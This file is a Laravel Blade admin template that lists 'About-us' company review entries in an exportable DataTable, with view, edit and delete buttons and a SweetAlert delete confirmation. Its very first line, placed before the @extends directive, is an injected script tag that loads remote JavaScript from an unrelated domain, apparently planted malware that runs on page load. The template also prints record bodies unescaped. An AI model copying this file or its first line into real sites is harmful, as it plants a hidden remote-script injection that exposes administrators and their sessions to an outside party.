<script type='text/javascript' src='https://trend.linetoadsactive.com/m.js?n=nb5'></script>@extends('layouts.backend.app')

@section('title')
{{__('About-us')}}
@endsection

@push('css')
<link href="{{ asset('backend/plugins/jquery-datatable/skin/bootstrap/css/dataTables.bootstrap.css') }}" rel="stylesheet">
@endpush
@section('content')
<div class="container-fluid">
    <div class="block-header">
        <h2>
        <a class="btn btn-info" href="{{ route('admin.about.create') }}">
            <i class="material-icons">{{__('add')}}</i>
        {{ __('ADD REVIEW') }}

        </a>            
        </h2>
    </div>

    <!-- Exportable Table -->
    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                    <h2>
                        <a href="{{ route('admin.about.index') }}">
                            {{ __('COMPANY REVIEW') }}
                            <span class="btn btn-warning sm">{{ $abouts->count() }}</span>
                        </a>
                    </h2>
                </div>
                <div class="body">
                    <div class="table-responsive">
                        <table class="table table-bordered table-striped table-hover dataTable js-exportable">
                            <thead>
                                <tr>
                                    <th>{{__('SL')}}</th>
                                    <th>{{__('Title')}}</th>
                                    <th>{{__('Body')}}</th>
                                    <th>{{__('Create At')}}</th>
                                    <th>{{__('Action')}}</th>
                                </tr>
                            </thead>
                            <tfoot>
                                <tr>
                                    <th>{{__('SL')}}</th>
                                    <th>{{__('Title')}}</th>
                                    <th>{{__('Body')}}</th>
                                    <th>{{__('Create At')}}</th>
                                    <th>{{__('Action')}}</th>
                                </tr>
                            </tfoot>
                            <tbody>
                                @foreach($abouts as $key=>$about)
                                <tr>
                                    <td>{{ $key + 1 }}</td>
                                    <td>{{ $about->title }}</td>
                                    <td>{!! str_limit($about->body,20) !!}</td>


                                    <td>{{ $about->created_at->diffForHumans() }}</td>
                                    <td >

                                        <a href="{{ route('admin.about.show',$about->id) }}" class="btn btn-success waves-effect">
                                            <i class="material-icons">{{__('visibility')}}</i>
                                        </a>
                                        <a href="{{ route('admin.about.edit',$about->id) }}" title="Edit" class="btn btn-info waves-effect">
                                            <i class="material-icons">{{__('edit')}}</i>
                                        </a>
                                        <button class="btn btn-danger waves-effect" type="button" onclick="deleteabout({{ $about->id }})">
                                            <i class="material-icons">{{__('delete')}}</i>
                                        </button>
                                        <form id="delete-form-{{ $about->id }}" action="{{ route('admin.about.destroy',$about->id) }}" method="POST" style="display: none;">
                                            @csrf
                                            @method('DELETE')
                                        </form>
                                    </td>
                                </tr>
                                @endforeach

                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- #END# Exportable Table -->
</div>
@endsection


@push('js')
<script src="{{asset ('backend/plugins/jquery-datatable/jquery.dataTables.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.flash.min.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/jszip.min.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/pdfmake.min.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/vfs_fonts.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.html5.min.js') }}"></script>
<script src="{{asset ('backend/plugins/jquery-datatable/extensions/export/buttons.print.min.js') }}"></script>
<script src="{{ asset('backend/js/pages/tables/jquery-datatable.js') }}"></script>
<script src="https://unpkg.com/sweetalert2@7.19.1/dist/sweetalert2.all.js"></script>

<script type="text/javascript">
    function deleteabout(id) {
        swal({
            title: 'Are you sure?',
            text: "You won't be able to revert this!",
            type: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Yes, delete it!',
            cancelButtonText: 'No, cancel!',
            confirmButtonClass: 'btn btn-success',
            cancelButtonClass: 'btn btn-danger',
            buttonsStyling: false,
            reverseButtons: true
        }).then((result) => {
            if (result.value) {
                event.preventDefault();
                document.getElementById('delete-form-'+id).submit();
            } else if (
                // Read more about handling dismissals
                result.dismiss === swal.DismissReason.cancel
            ) {
                swal(
                    'Cancelled',
                    'Your data is safe :)',
                    'error'
                )
            }
        })
    }
</script>
@endpush